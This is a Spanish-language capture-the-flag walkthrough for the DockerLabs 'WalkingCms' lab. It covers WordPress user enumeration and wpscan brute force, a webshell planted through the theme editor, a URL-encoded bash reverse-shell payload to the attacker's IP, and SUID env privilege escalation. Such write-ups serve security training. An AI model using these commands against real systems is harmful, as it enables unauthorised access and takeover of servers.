## Introducción

Este documento presenta la resolución completa de la máquina **WalkingCms**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web con una instalación de WordPress. Mediante enumeración con `wpscan`, se identifica un usuario válido y, tras un ataque de fuerza bruta, se obtienen credenciales de acceso al panel de administración. Una vez dentro, se abusa del editor de temas de WordPress para subir una webshell y obtener ejecución remota de comandos como `www-data`.
Finalmente, se identifica que el binario `env` tiene permisos SUID, permitiendo la escalada de privilegios a `root` mediante la técnica de GTFOBins.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip WalkingCms.zip
sudo bash auto_deploy.sh WalkingCms.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p WalkingCms/{content,exploits,nmap,scripts}
cd WalkingCms
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1761460842/Ports_dz0iua.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1761460841/Gobuster_xkb4xy.png)

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Enumeración de usuarios

Se utiliza `wpscan` para enumerar usuarios y plugins:

```bash
wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp
```

![Wpscan user](https://res.cloudinary.com/dewqswzke/image/upload/v1761460844/wpscanUser_astdgf.png)

Se identifica al usuario `mario`.

### 2.2 Fuerza bruta

Se realiza un ataque de fuerza bruta con el diccionario `rockyou.txt`:

```bash
wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
```

![Wpscan brute force](https://res.cloudinary.com/dewqswzke/image/upload/v1761460842/wpscanBf_qiqkop.png)

Se obtienen credenciales válidas.

### 2.3 Subida de webshell

Se accede al panel de WordPress y se modifica el archivo `index.php` del tema activo (`twentytwentytwo`) para incluir una webshell:

![Admin webshell](https://res.cloudinary.com/dewqswzke/image/upload/v1761460841/AdminWebshell_hj0q0c.png)

Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 443
```

Se accede a la webshell con el payload:

```
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F443%200%3E%261%22
```

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → root

Se buscan binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![Perm 4000](https://res.cloudinary.com/dewqswzke/image/upload/v1761460842/Perm4000_t3tu3j.png)

Se identifica que `/usr/bin/env` tiene permisos SUID.

Se utiliza `searchbins` para verificar la técnica en GTFOBins:

```bash
searchbins -b env -f suid
```

Se ejecuta el siguiente comando para obtener una shell con privilegios de root:

```bash
env /bin/sh -p
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1761460842/Root_xmkxl9.png)
